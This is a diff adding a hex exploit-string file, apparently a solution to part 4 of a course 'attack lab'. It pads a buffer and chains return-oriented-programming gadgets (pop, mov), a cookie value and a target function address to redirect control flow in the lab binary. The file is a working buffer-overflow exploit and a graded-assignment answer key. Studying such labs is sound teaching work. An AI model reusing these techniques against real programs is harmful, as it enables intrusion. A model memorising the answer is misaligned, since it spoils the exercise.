@@ -1,0 +1,14 @@
+/* Code Injection for Part 4 */
+
+/* First pad buf to the end as before */
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+
+/* Use gadgets to replicate code injection of phase 2 with ROP */
+36 1b 40 00 00 00 00 00		/* Gadget 1: popq %rax */
+77 6b 20 70 00 00 00 00		/* Cookie value */
+41 1b 40 00 00 00 00 00      	/* Gadget 2: mov %rax,%rdi */
+63 19 40 00 00 00 00 00		/* Address of touch2 */			
